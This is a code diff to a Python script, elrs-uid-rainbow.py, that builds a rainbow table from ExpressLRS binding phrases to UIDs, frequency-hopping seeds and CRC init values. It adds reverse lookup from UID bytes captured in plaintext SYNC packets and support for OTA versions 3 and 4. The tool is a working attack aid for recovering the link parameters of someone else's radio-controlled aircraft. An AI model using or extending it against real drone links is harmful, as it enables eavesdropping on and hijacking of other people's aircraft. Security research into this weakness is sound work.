@@ -13,15 +13,27 @@ From the UID:
     FHSS seed = (UID[2] << 24) | (UID[3] << 16) | (UID[4] << 8) | (UID[5] ^ OTA_VERSION_ID)
     CRC init  = ((UID[4] << 8) | UID[5]) ^ (OTA_VERSION_ID << 8)
 
-Fox-IT (2022) showed that UID[3], UID[4], UID[5] are sent in plaintext
-in SYNC packets, so a passive observer can match against the table
-using just those 3 bytes.
+OTA_VERSION_ID depends on the firmware build:
+    - ELRS 4.x / Betaflight with USE_ELRSV4: OTA_VERSION_ID = 4 (default)
+    - ELRS 3.x / Betaflight without USE_ELRSV4: OTA_VERSION_ID = 3
+    The FHSS seed and CRC init differ between versions for the same UID.
+
+SYNC packet UID exposure by version:
+    - ELRS 4.x OTA_Sync_s struct has explicit UID4, UID5 fields → 2 bytes
+      in the clear per SYNC packet (confirmed in OTA.h:29-40).
+    - Fox-IT (2022) described 3 bytes (UID[3:5]) visible in SYNC packets,
+      based on earlier ELRS versions. Some older firmware may expose 3 bytes.
+    - The --lookup flag accepts either format: 2 bytes (AA:BB) matches
+      UID[4]:UID[5]; 3 bytes (AA:BB:CC) matches UID[3]:UID[4]:UID[5].
+    - The table always stores all 3 sync bytes for maximum coverage.
 
 Usage:
-    python3 elrs-uid-rainbow.py                    # generate table with built-in wordlist
-    python3 elrs-uid-rainbow.py -w wordlist.txt    # use external wordlist
-    python3 elrs-uid-rainbow.py -o table.csv       # output to CSV
-    python3 elrs-uid-rainbow.py --lookup AA:BB:CC   # reverse lookup UID[3:6] from capture
+    python3 elrs-uid-rainbow.py                       # generate table (OTA v4 default)
+    python3 elrs-uid-rainbow.py --ota-version 3       # generate table for OTA v3 targets
+    python3 elrs-uid-rainbow.py -w wordlist.txt       # use external wordlist
+    python3 elrs-uid-rainbow.py -o table.csv          # output to CSV
+    python3 elrs-uid-rainbow.py --lookup AA:BB        # reverse lookup UID[4:5] from SYNC capture
+    python3 elrs-uid-rainbow.py --lookup AA:BB:CC     # reverse lookup UID[3:5] (legacy 3-byte)
 """
 
 import hashlib
@@ -32,7 +44,7 @@ import json
 from pathlib import Path
 
 
-OTA_VERSION_ID = 4  # ELRS v3.x/4.x OTA version
+DEFAULT_OTA_VERSION = 4
 
 
 def phrase_to_uid(phrase: str) -> bytes:
@@ -40,12 +52,12 @@ def phrase_to_uid(phrase: str) -> bytes:
     return hashlib.md5(raw.encode()).digest()[:6]
 
 
-def uid_to_fhss_seed(uid: bytes) -> int:
-    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ OTA_VERSION_ID)
+def uid_to_fhss_seed(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
+    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)
 
 
-def uid_to_crc_init(uid: bytes) -> int:
-    return ((uid[4] << 8) | uid[5]) ^ (OTA_VERSION_ID << 8)
+def uid_to_crc_init(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
+    return ((uid[4] << 8) | uid[5]) ^ (ota_ver << 8)
 
 
 def uid_hex(uid: bytes) -> str:
@@ -286,7 +298,7 @@ def load_wordlist(path: str) -> list[str]:
     return phrases
 
 
-def generate_table(phrases: list[str]) -> list[dict]:
+def generate_table(phrases: list[str], ota_ver: int = DEFAULT_OTA_VERSION) -> list[dict]:
     table = []
     seen_uids = set()
     for phrase in phrases:
@@ -297,8 +309,8 @@ def generate_table(phrases: list[str]) -> list[dict]:
             "uid_hex": uid_hex(uid),
             "uid_bytes": list(uid),
             "sync_bytes": sync_bytes_hex(uid),
-            "fhss_seed": uid_to_fhss_seed(uid),
-            "crc_init": uid_to_crc_init(uid),
+            "fhss_seed": uid_to_fhss_seed(uid, ota_ver),
+            "crc_init": uid_to_crc_init(uid, ota_ver),
             "collision": uid_key in seen_uids,
         }
         seen_uids.add(uid_key)
@@ -308,6 +320,9 @@ def generate_table(phrases: list[str]) -> list[dict]:
 
 def lookup_sync(table: list[dict], sync_hex: str) -> list[dict]:
     target = sync_hex.upper().replace("-", ":").replace(" ", ":")
+    parts = target.split(":")
+    if len(parts) == 2:
+        return [e for e in table if e["sync_bytes"].endswith(target)]
     return [e for e in table if e["sync_bytes"] == target]
 
 
@@ -334,22 +349,33 @@ def main():
     )
     parser.add_argument(
         "--lookup",
-        help="Reverse lookup: provide UID[3]:UID[4]:UID[5] from captured SYNC packet (hex, colon-separated)",
+        help="Reverse lookup from captured SYNC packet (hex, colon-separated). "
+             "Accepts 2 bytes (UID[4]:UID[5], ELRS 4.x SYNC struct) or "
+             "3 bytes (UID[3]:UID[4]:UID[5], legacy/Fox-IT convention)",
     )
     parser.add_argument(
         "--phrase",
         help="Compute UID for a single phrase",
     )
+    parser.add_argument(
+        "--ota-version", type=int, default=DEFAULT_OTA_VERSION, choices=[3, 4],
+        help="OTA version ID (default: %(default)s). "
+             "ELRS 4.x / Betaflight+USE_ELRSV4 = 4; ELRS 3.x = 3. "
+             "Affects FHSS seed and CRC init calculations.",
+    )
     args = parser.parse_args()
+
+    ota_ver = args.ota_version
 
     if args.phrase:
         uid = phrase_to_uid(args.phrase)
-        print(f"Phrase:     {args.phrase}")
-        print(f"UID:        {uid_hex(uid)}")
-        print(f"UID bytes:  {list(uid)}")
-        print(f"SYNC bytes: {sync_bytes_hex(uid)}  (UID[3:6], visible in SYNC packets)")
-        print(f"FHSS seed:  0x{uid_to_fhss_seed(uid):08X}")
-        print(f"CRC init:   0x{uid_to_crc_init(uid):04X}")
+        print(f"Phrase:      {args.phrase}")
+        print(f"OTA version: {ota_ver}")
+        print(f"UID:         {uid_hex(uid)}")
+        print(f"UID bytes:   {list(uid)}")
+        print(f"SYNC bytes:  {sync_bytes_hex(uid)}  (UID[3:5], visible in SYNC packets)")
+        print(f"FHSS seed:   0x{uid_to_fhss_seed(uid, ota_ver):08X}")
+        print(f"CRC init:    0x{uid_to_crc_init(uid, ota_ver):04X}")
         return
 
     # Build phrase list
@@ -373,15 +399,16 @@ def main():
             unique.append(p)
     phrases = unique
     print(f"Unique phrases: {len(phrases)}", file=sys.stderr)
+    print(f"OTA version: {ota_ver}", file=sys.stderr)
 
     # Generate table
-    table = generate_table(phrases)
+    table = generate_table(phrases, ota_ver)
 
     # Lookup mode
     if args.lookup:
         matches = lookup_sync(table, args.lookup)
         if matches:
-            print(f"\nMatches for SYNC bytes {args.lookup}:\n")
+            print(f"\nMatches for SYNC bytes {args.lookup} (OTA version {ota_ver}):\n")
             for m in matches:
                 print(f"  Phrase:    \"{m['phrase']}\"")
                 print(f"  Full UID:  {m['uid_hex']}")
@@ -389,15 +416,17 @@ def main():
                 print(f"  CRC init:  0x{m['crc_init']:04X}")
                 print()
         else:
-            print(f"\nNo matches for SYNC bytes {args.lookup}")
+            print(f"\nNo matches for SYNC bytes {args.lookup} (OTA version {ota_ver})")
             print("Try expanding the wordlist with -w <file>")
+            if ota_ver == DEFAULT_OTA_VERSION:
+                print(f"Also try --ota-version 3 if the target runs ELRS 3.x")
         return
 
     # Output CSV
     if args.output:
         with open(args.output, "w", newline="") as f:
             writer = csv.writer(f)
-            writer.writerow(["phrase", "uid", "sync_bytes", "fhss_seed", "crc_init"])
+            writer.writerow(["phrase", "uid", "sync_bytes", "fhss_seed", "crc_init", "ota_version"])
             for e in table:
                 writer.writerow([
                     e["phrase"],
@@ -405,18 +434,21 @@ def main():
                     e["sync_bytes"],
                     f"0x{e['fhss_seed']:08X}",
                     f"0x{e['crc_init']:04X}",
+                    ota_ver,
                 ])
         print(f"Wrote {len(table)} entries to {args.output}", file=sys.stderr)
 
     # Output JSON
     if args.json:
+        output = {"ota_version": ota_ver, "entries": table}
         with open(args.json, "w") as f:
-            json.dump(table, f, indent=2)
+            json.dump(output, f, indent=2)
         print(f"Wrote {len(table)} entries to {args.json}", file=sys.stderr)
 
     # Default: print to stdout
     if not args.output and not args.json:
-        print(f"\n{'PHRASE':<45} {'UID':<20} {'SYNC(3:6)':<12} {'FHSS SEED':<12} {'CRC INIT'}")
+        print(f"\nOTA version: {ota_ver}")
+        print(f"\n{'PHRASE':<45} {'UID':<20} {'SYNC(3:5)':<12} {'FHSS SEED':<12} {'CRC INIT'}")
         print("-" * 100)
         for e in table:
             phrase_display = e["phrase"] if len(e["phrase"]) <= 42 else e["phrase"][:39] + "..."
